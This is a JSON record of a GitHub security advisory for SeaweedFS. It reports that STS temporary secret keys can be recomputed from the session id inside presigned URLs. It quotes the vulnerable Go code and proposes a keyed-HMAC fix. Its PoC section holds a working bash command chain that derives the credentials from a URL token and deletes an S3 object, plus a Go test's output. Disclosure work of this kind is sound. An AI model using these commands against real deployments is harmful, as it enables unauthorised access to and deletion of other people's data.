@@ -1,0 +1,47 @@
+{
+  "global": null,
+  "id": "GHSA-p983-2j86-34vj",
+  "repo": {
+    "cve_id": null,
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": 9.1,
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N"
+      },
+      "cvss_v4": {
+        "score": null,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [
+      "CWE-341",
+      "CWE-522"
+    ],
+    "description": "### Summary\n\nSeaweedFS derives an STS session's secret access key from the session id with a plain SHA-256 and no server-side secret, and publishes that session id inside the session token. Because the session token travels in `X-Amz-Security-Token`, including in the query string of every presigned URL, anyone who receives a presigned URL, or reads it out of a log, can recompute the full temporary credential and sign arbitrary S3 requests with the session's permissions until it expires.\n\n### Details\n\n`weed/iam/sts/token_utils.go:199-217`:\n\n```go\nfunc (c *CredentialGenerator) generateTemporaryAccessKeyId(sessionId string) (string, error) {\n\thash := sha256.Sum256([]byte(\"access-key:\" + sessionId))\n\treturn \"ASIA\" + hex.EncodeToString(hash[:8]), nil\n}\n\nfunc (c *CredentialGenerator) generateSecretAccessKey(sessionId string) (string, error) {\n\t// Create deterministic secret key based on session ID (not random!)\n\thash := sha256.Sum256([]byte(\"secret-key:\" + sessionId))\n\treturn base64.StdEncoding.EncodeToString(hash[:]), nil\n}\n```\n\n`sessionId` is 16 random bytes (`GenerateSessionId`, `token_utils.go:226`) but it is not secret: `NewSTSSessionClaims` (`weed/iam/sts/session_claims.go:103-120`) writes it into the JWT as `sub`, `jti` and `sid` (field at `session_claims.go:69`). A JWT payload is base64url, so reading it needs no key.\n\nThat token is accepted from the query string for presigned URLs (`weed/s3api/auth_signature_v4.go:236-239`):\n\n```go\nsessionToken := r.Header.Get(\"X-Amz-Security-Token\")\nif sessionToken == \"\" {\n\tsessionToken = r.URL.Query().Get(\"X-Amz-Security-Token\")\n}\n```\n\nVerification regenerates the credential from the session id rather than comparing a stored secret (`ToSessionInfo`, `session_claims.go:125-160` calling `GenerateTemporaryCredentials`), and `validateSTSSessionToken` (`auth_signature_v4.go:386-433`) only checks that the request's access key equals the regenerated one. Both sides therefore compute the attacker's value.\n\nEvery issuing path uses the same generator: `AssumeRoleWithWebIdentity` (`sts_service.go:610`), `AssumeRoleWithCredentials` / `AssumeRoleForPrincipal` (`sts_service.go:775`), `AssumeRole` (`s3api_sts.go:925`), `GetFederationToken` (`s3api_sts.go:806`) and Iceberg credential vending (`s3api_iceberg_credentials.go:70`).\n\nNote: the same token is separately accepted as `Authorization: Bearer` (`s3api_auth.go:18` reaching `s3_iam_middleware.go:186-225`), so a fix that only randomises the secret still leaves presigned URLs equivalent to credentials. The secret should be derived with an HMAC keyed on the STS signing key, for example `HMAC-SHA256(stsSigningKey, \"secret-key:\"+sessionId)`, which keeps the stateless design while making the value unguessable without the server key.\n\n### PoC\n\n**Configuration.** An S3 gateway with the advanced IAM/STS integration active: `weed s3 -iam.config=<file>`, or the default `-iam=true` whenever an STS signing key resolves (`jwt.filer_signing.key` in `security.toml`, or an initialised SSE-S3 KEK); see `weed/s3api/s3api_server.go:374-425`. Any deployment that issues STS credentials is in scope.\n\n**By hand.** Take any presigned URL generated from an STS session; it carries `X-Amz-Security-Token=eyJhbGciOiJIUzI1NiIs...`. With only that value:\n\n```bash\nTOKEN='<the X-Amz-Security-Token value from the URL>'\nSID=$(printf '%s' \"$TOKEN\" | cut -d. -f2 | tr '_-' '/+' \\\n        | awk '{ while (length($0)%4) $0=$0\"=\"; print }' | base64 -d \\\n        | python3 -c 'import json,sys; print(json.load(sys.stdin)[\"sid\"])')\n\nAK=\"ASIA$(printf 'access-key:%s' \"$SID\" | sha256sum | cut -c1-16)\"\nSK=$(printf 'secret-key:%s' \"$SID\" | sha256sum | cut -d' ' -f1 | xxd -r -p | base64)\n\nAWS_ACCESS_KEY_ID=$AK AWS_SECRET_ACCESS_KEY=$SK AWS_SESSION_TOKEN=$TOKEN \\\n  aws --endpoint-url https://s3.example.com s3 rm s3://reports/2025-payroll.csv\n```\n\nThe URL delegated one `GET` on one object; the command deletes a different one.\n\n**Scripted.** A self-contained Go test drives the real STS service and the real SigV4 verifier (`IdentityAccessManagement.reqSignatureV4Verify`); no production code is modified. It issues a session, builds a presigned URL from it, recovers the credential from that URL's `X-Amz-Security-Token` alone, and signs a `DELETE` on a different object.\n\n```\ngit checkout 66f17548966cedaedcc58b4afba72c39d81d7367\n# copy poc_test.go into weed/s3api/, then:\ngo test -count=1 ./weed/s3api/ -run TestAresPoC_STSSecretKeyDerivableFromSessionToken -v\n```\n\nObserved at `66f17548966cedaedcc58b4afba72c39d81d7367` (v4.47 plus 5 commits). Key values differ per run because the session id is random; the equality is the point:\n\n```\n=== RUN   TestAresPoC_STSSecretKeyDerivableFromSessionToken\n     session id read from the unverified token: a259a1b4aead103d304306cd5f8dc29b\n     issued  AccessKeyId=ASIA8f3c1ecf5c99730f SecretAccessKey=gx1R8waEyCC/MzTv6KeSLdcPhew4zM4rsZIHuVQFMvA=\n     derived AccessKeyId=ASIA8f3c1ecf5c99730f SecretAccessKey=gx1R8waEyCC/MzTv6KeSLdcPhew4zM4rsZIHuVQFMvA=\nFAIL  full temporary credential recovered from the presigned URL's session token\nPASS  positive control: the issued credential verifies -> the SigV4 path is live\nPASS  negative control: a wrong secret is rejected -> signatures are enforced\nFAIL  forged DELETE on a different object accepted as principal \"arn:aws:sts::assumed-role/AppRole/alice-session\"\n    RESULT: VULNERABLE\n--- PASS: TestAresPoC_STSSecretKeyDerivableFromSessionToken (0.00s)\n```\n\nControls: the credential the server actually issued verifies through `reqSignatureV4Verify`, so the path under test is live rather than stubbed; the same request signed with a wrong secret is rejected, so signatures really are checked and the harness would detect a working credential check. The accepted request is a `DELETE` on a different object than the presigned `GET`. The attacker side of the test reads only the presigned URL's query string and never touches the STS signing key. The full PoC bundle (driver script, test source, recorded output, environment) is available on request.\n\n**Version range.** Introduced by `23fc3f262` (2026-01-03), first released in 4.06; 4.05 still used `crypto/rand` for the secret: `git show 4.05:weed/iam/sts/token_utils.go` shows `rand.Read(secretBytes)` while `git show 4.06:...` shows `sha256.Sum256([]byte(\"secret-key:\" + sessionId))`. Runtime reproduction was performed only at the HEAD commit above; earlier releases rest on inspection of the tagged trees.\n\n### Impact\n\nInsufficiently protected credentials arising from predictable-from-observable-state credential generation. A presigned URL is meant to be a narrow, safe-to-share capability; here it discloses the signer's whole temporary credential. The recipient, who holds no account, gains every permission the assumed role carries across every bucket its policies allow, for the rest of the session (default 1 hour, up to `maxSessionLength` 12 hours, and up to 36 hours for `GetFederationToken`). The same disclosure follows from any access log, reverse proxy, CDN, `Referer` header or browser history that records the request URL. Affects operators using OIDC federation, `AssumeRole`, `GetFederationToken`, or Iceberg credential vending.\n\n### Credits\n\n- Thai Son Dinh from VinSOC Labs (R&D)\n",
+    "ghsa_id": "GHSA-p983-2j86-34vj",
+    "html_url": "https://github.com/seaweedfs/seaweedfs/security/advisories/GHSA-p983-2j86-34vj",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-p983-2j86-34vj"
+      }
+    ],
+    "published_at": "2026-11-09T19:51:10Z",
+    "references": [],
+    "severity": "critical",
+    "summary": "STS temporary credentials are recoverable from the session token",
+    "updated_at": "2026-11-09T19:51:10Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "go",
+          "name": "github.com/seaweedfs/seaweedfs"
+        },
+        "patched_versions": null,
+        "vulnerable_version_range": ">= 4.06"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "seaweedfs/seaweedfs"
+}
